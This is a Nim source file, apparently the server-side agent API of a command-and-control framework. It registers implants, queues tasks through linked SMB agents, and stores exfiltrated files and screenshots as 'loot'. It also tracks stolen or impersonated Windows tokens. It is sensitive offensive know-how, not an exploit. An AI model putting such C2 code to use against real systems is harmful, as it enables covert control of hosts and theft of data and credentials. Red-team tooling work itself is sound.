import terminal, strformat, strutils, sequtils, tables, os, times

import ../globals
import ../db/database
import ../core/[packer, logger, websocket]
import ../../common/[utils, serialize]
import ../../types/[common, server, protocol]

#[
  Agent API
  Functions relevant for dealing with the agent API, such as registering new agents, querying tasks and posting results
]#
proc register*(registrationData: seq[byte], remoteAddress: string): bool {.discardable.} = 
    {.cast(gcsafe).}:
        try:
            let agent: Agent = cq.deserializeNewAgent(registrationData, remoteAddress)

            if not cq.dbListenerExists(agent.listenerId.toUpperAscii): 
                raise newException(CatchableError, fmt"{agent.ipInternal} attempted to register to non-existent listener: {agent.listenerId}.")

            if not cq.dbAgentExists(agent.agentId):
                if not cq.dbStoreAgent(agent):
                    raise newException(CatchableError, fmt"Failed to insert agent {agent.agentId} into database.")

            if not cq.makeAgentLogDirectory(agent.agentId):
                cq.error("Failed to create log directory.\n")
                return false

            cq.agents[agent.agentId] = agent
            cq.info("Agent ", fgYellow, styleBright, agent.agentId, resetStyle, " connected to listener ", fgGreen, styleBright, agent.listenerId, resetStyle, ": ", fgYellow, styleBright, fmt"{agent.username}@{agent.hostname}")
            cq.sendAgent(agent)
            cq.sendEventlogItem(LOG_INFO_SHORT, fmt"Agent {agent.agentId} connected to listener {agent.listenerId}.")
            return true
        
        except CatchableError as err:
            cq.error(err.msg) 
            return false

proc getTasks*(heartbeat: seq[byte]): Table[string, seq[seq[byte]]] = 

    {.cast(gcsafe).}:

        # Deserialize checkin request to obtain agentId and listenerId 
        let 
            request: Heartbeat = cq.deserializeHeartbeat(heartbeat)
            agentId = Uuid.toString(request.header.agentId)
            listenerId = Uuid.toString(request.listenerId)
            timestamp = request.timestamp
        var tasks = initTable[string, seq[seq[byte]]]()

        # Check if listener exists
        if not cq.dbListenerExists(listenerId): 
            raise newException(ValueError, fmt"Task-retrieval request made to non-existent listener: {listenerId}.")

        # Check if agent exists
        if not cq.dbAgentExists(agentId): 
            raise newException(ValueError, fmt"Task-retrieval request made to non-existent agent: {agentId}.")

        if not cq.agents.hasKey(agentId):
            return tasks

        # Update the last check-in date for the accessed agent
        cq.agents[agentId].latestCheckin = cast[int64](timestamp)
        cq.sendAgentCheckin(agentId)
        
        proc collectTasks(agentId: string)=
            var temp = newSeq[seq[byte]]()
            for task in cq.agents[agentId].tasks.mitems():
                let taskData = cq.serializeTask(task)
                temp.add(taskData)

            if temp.len() > 0:
                tasks[agentId] = temp

            # Recursively collect tasks for linked agents
            for linkedAgentId in cq.agents[agentId].links:
                if cq.agents.hasKey(linkedAgentId): 
                    cq.sendAgentCheckin(linkedAgentId)
                    collectTasks(linkedAgentId)

            # Clear task queue
            cq.agents[agentId].tasks = @[]

        collectTasks(agentId)        
        return tasks

proc handleResult*(resultData: seq[byte]) = 

    {.cast(gcsafe).}:

        try:
            let
                taskResult = cq.deserializeTaskResult(resultData) 
                taskId = Uuid.toString(taskResult.taskId)
                agentId = Uuid.toString(taskResult.header.agentId)
            
            cq.sendConsoleItem(agentId, LOG_INFO, fmt"{$resultData.len} bytes received.")
            cq.info(fmt"{$resultData.len} bytes received.")
            
            case cast[StatusType](taskResult.status):
            of STATUS_STARTED:
                cq.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Job started.")
                cq.success(fmt"Job {taskId} started.")

                case cast[CommandType](taskResult.command):
                of CMD_DOWNLOAD:
                    var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
                    let
                        remoteFilePath = unpacker.getDataWithLengthPrefix()
                        fileName = remoteFilePath.replace("\\", "_").replace("/", "_").replace(":", "")
                        totalSize = unpacker.getUint64()

                    # Create loot directory for the agent
                    createDir(fmt"{cq.lootDir}/{agentId}")
                    let downloadPath = fmt"{cq.lootDir}/{agentId}/{fileName}"

                    cq.downloads[taskId] = Download(
                        path: downloadPath,
                        remotePath: remoteFilePath,
                        total: totalSize,
                        written: 0,
                        file: open(downloadPath & ".partial", fmWrite)  # Downloads are stored with a .partial extension until the full file is received
                    )
                
                else:
                    if taskResult.data.len() > 0:
                        cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data))

            of STATUS_IN_PROGRESS:
                # Get command for output handler
                let command = cq.agents[agentId].taskCommands.getOrDefault(taskResult.taskId, "")
                
                case cast[CommandType](taskResult.command):
                of CMD_DOWNLOAD:
                    if cq.downloads.hasKey(taskId):
                        var download = addr cq.downloads[taskId]
                        if taskResult.data.len() > 0:
                            discard download.file.writeBuffer(addr taskResult.data[0], taskResult.data.len())
                            download.written += uint64(taskResult.data.len())

                            let progress = (download.written.float / download.total.float * 100)
                            cq.sendConsoleItem(agentId, LOG_INFO, fmt"Task {taskId} in progress: {progress:.2f}%")
                
                else:
                    if int(taskResult.length) > 0:        
                        cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), command, taskId)

                return

            of STATUS_COMPLETED:
                cq.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Task {taskId} completed.")
                cq.success(fmt"Task {taskId} completed.")

                # Get command for output handler
                let command = cq.agents[agentId].taskCommands.getOrDefault(taskResult.taskId, "")
                cq.agents[agentId].taskCommands.del(taskResult.taskId)

                # Handle command specific actions on task completion (e.g. triggering UI changes, writing files, ...) 
                case cast[CommandType](taskResult.command):
                of CMD_CONFIG:
                    var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
                    let 
                        newListenerId = unpacker.getDataWithLengthPrefix()
                        newDelay = int(unpacker.getUint32())

                    # Update stored listenerId
                    if newListenerId != cq.agents[agentId].listenerId: 
                        cq.agents[agentId].listenerId = newListenerId
                        discard cq.dbUpdateAgent(cq.agents[agentId])

                    # Update stored sleep delay if it has changed
                    if newDelay != cq.agents[agentId].sleep: 
                        cq.agents[agentId].sleep = newDelay
                        discard cq.dbUpdateAgent(cq.agents[agentId])

                    cq.sendConfig(agentId, Bytes.toString(taskResult.data))

                of CMD_DOWNLOAD:
                    # Complete download job
                    if cq.downloads.hasKey(taskId):
                        var download = addr cq.downloads[taskId]
                        if taskResult.data.len() > 0:
                            discard download.file.writeBuffer(addr taskResult.data[0], taskResult.data.len())
                            download.written += uint64(taskResult.data.len())
                        download.file.close()

                        moveFile(download.path & ".partial", download.path) # Remove .partial extension 

                        let fileInfo = getFileInfo(download.path)
                        var lootItem = LootItem(
                            lootId: generateUuid(),
                            itemType: DOWNLOAD,
                            agentId: agentId,
                            path: download.path,
                            remotePath: download.remotePath,
                            timestamp: fileInfo.creationTime.toUnix(),
                            size: fileInfo.size,
                            host: cq.agents[agentId].hostname
                        )
                        discard cq.dbStoreLoot(lootItem)
                        cq.sendLoot(lootItem)

                        cq.output(fmt"File downloaded to {download.path} ({download.written} bytes).", "\n")
                        cq.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {download.path} ({download.written} bytes).")
                        
                        # Remove completed download from in-memory table
                        cq.downloads.del(taskId)

                of CMD_SCREENSHOT:
                    # Write screenshot data to disk
                    var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
                    let
                        remoteFileName = unpacker.getDataWithLengthPrefix()
                        fileName = remoteFileName.replace("\\", "_").replace("/", "_").replace(":", "")
                        fileData = unpacker.getDataWithLengthPrefix()

                    createDir(fmt"{cq.lootDir}/{agentId}")
                    let downloadPath = fmt"{cq.lootDir}/{agentId}/{fileName}"
                    writeFile(downloadPath, fileData)

                    let fileInfo = getFileInfo(downloadPath)
                    var lootItem = LootItem(
                        lootId: generateUuid(),
                        itemType: SCREENSHOT,
                        agentId: agentId,
                        path: downloadPath,
                        remotePath: remoteFileName,
                        timestamp: fileInfo.creationTime.toUnix(),
                        size: fileInfo.size,
                        host: cq.agents[agentId].hostname
                    )
                    discard cq.dbStoreLoot(lootItem)
                    cq.sendLoot(lootItem)

                    cq.output(fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).", "\n")
                    cq.sendConsoleItem(agentId, LOG_OUTPUT, fmt"File downloaded to {downloadPath} ({$fileData.len()} bytes).")

                of CMD_MAKE_TOKEN, CMD_STEAL_TOKEN, CMD_USE_TOKEN: 
                    # Update impersonation token in database & client UI
                    let output = Bytes.toString(taskResult.data)
                    if output.startsWith("Impersonated"):
                        cq.agents[agentId].impersonationToken = output.split(" ", 1)[1..^1].join(" ")[0..^2]
                        if cq.dbUpdateAgent(cq.agents[agentId]):
                            cq.sendImpersonationToken(agentId, cq.agents[agentId].impersonationToken)
                                
                of CMD_REV2SELF:
                    # Remove impersonation token
                    cq.agents[agentId].impersonationToken.setLen(0)
                    if cq.dbUpdateAgent(cq.agents[agentId]):
                        cq.sendRevertToken(agentId)
                
                of CMD_CD, CMD_PWD: 
                    # Update working directory in the client UI
                    cq.sendWorkingDirectory(agentId, Bytes.toString(taskResult.data))

                of CMD_LINK: 
                    # When an SMB agent is linked, the registration data is sent as the task result of the 'link' command
                    # We register the newly linked agent as a child of the requesting agent
                    var unpacker = Unpacker.init(Bytes.toString(taskResult.data))
                    discard unpacker.getUint8()
                    let registrationBytes = string.toBytes(unpacker.getDataWithLengthPrefix())
                    
                    let agent = cq.deserializeNewAgent(registrationBytes, "")
                    cq.agents[agentId].links.add(agent.agentId)
                    if not cq.dbStoreLink(agentId, agent.agentId):
                        raise newException(CatchableError, "Failed to store link in database.")
                    discard register(registrationBytes, cq.agents[agentId].ipExternal)
                    cq.sendUpdateParent(agent.agentId, agentId)

                of CMD_UNLINK: 
                    # Remove the link between two agents
                    let linkedAgentId = Bytes.toString(taskResult.data).toUpperAscii()
                    cq.agents[agentId].links.keepItIf(it != linkedAgentId)
                    if not cq.dbDeleteLink(agentId, linkedAgentId):
                        raise newException(CatchableError, "Failed to delete link from database.")
                    cq.sendUpdateParent(linkedAgentId, "")

                of CMD_PS:
                    # Send process list to the client
                    cq.sendProcessList(agentId, Bytes.toString(taskResult.data))

                of CMD_LS:
                    # Send directory listing data to the client
                    cq.sendDirectoryListing(agentId, Bytes.toString(taskResult.data))

                of CMD_JOBS:
                    # Send list of pending job to the client 
                    cq.sendJobs(agentId, Bytes.toString(taskResult.data))

                of CMD_LINKS: 
                    # Send list of linked agents
                    cq.sendLinks(agentId, Bytes.toString(taskResult.data))

                else: discard 
                
                # Output RESULT_STRING packets to the agent console
                if cast[ResultType](taskResult.resultType) == RESULT_STRING and int(taskResult.length) > 0:
                    cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data), command, taskId)

            of STATUS_FAILED: 
                cq.sendConsoleItem(agentId, LOG_ERROR, fmt"Task {taskId} failed.")
                cq.error(fmt"Task {taskId} failed.")

                # Remove failed task
                cq.agents[agentId].taskCommands.del(taskResult.taskId)

                if int(taskResult.length) > 0:
                    cq.sendConsoleItem(agentId, LOG_OUTPUT, Bytes.toString(taskResult.data))

            of STATUS_CANCELLED:
                cq.sendConsoleItem(agentId, LOG_SUCCESS, fmt"Job {taskId} cancelled.")
                cq.info(fmt"Job {taskId} cancelled.")

                # Remove cancelled task
                cq.agents[agentId].taskCommands.del(taskResult.taskId)

                case cast[CommandType](taskResult.command):
                of CMD_DOWNLOAD:
                    if cq.downloads.hasKey(taskId):
                        cq.downloads[taskId].file.close()
                        removeFile(cq.downloads[taskId].path & ".partial")  # Delete partial download
                        cq.downloads.del(taskId)
                else: discard

            else: discard
            
        except CatchableError as err:
            cq.error(err.msg, "\n")